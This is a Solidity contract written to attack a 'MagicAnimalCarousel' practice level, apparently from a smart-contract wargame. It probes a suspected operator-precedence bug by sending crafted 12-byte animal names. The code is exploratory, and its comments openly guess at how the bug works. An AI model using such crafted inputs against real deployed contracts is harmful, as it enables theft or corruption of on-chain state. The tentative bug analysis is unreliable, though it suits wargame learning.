// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract ExploitMagicCarousel {
    MagicAnimalCarousel target;
    
    constructor(address _target) {
        target = MagicAnimalCarousel(_target);
    }
    
    function exploit() external {
        // The bug: encodedAnimal << 160 + 16 means (encodedAnimal << 160) + 16
        // This adds 16 to the shifted value
        
        // Looking at the storage layout and operations more carefully:
        // In setAnimalAndSpin, the XOR operation with the buggy shift might
        // allow us to manipulate the bits in unexpected ways
        
        // Let's try to understand by setting a simple animal first
        target.setAnimalAndSpin("A");
    }
    
    function exploitPrecendenceBug() external {
        // We need an animal name that exploits the precedence bug
        // The goal is likely to manipulate crate 0 somehow
        
        // Maximum 12-byte string
        bytes memory data = new bytes(12);
        for(uint i = 0; i < 12; i++) {
            data[i] = 0xFF;
        }
        
        target.setAnimalAndSpin(string(data));
    }
    
    function readCrate(uint256 id) external view returns (uint256) {
        return target.carousel(id);
    }
    
    function getCurrentCrate() external view returns (uint256) {
        return target.currentCrateId();
    }
}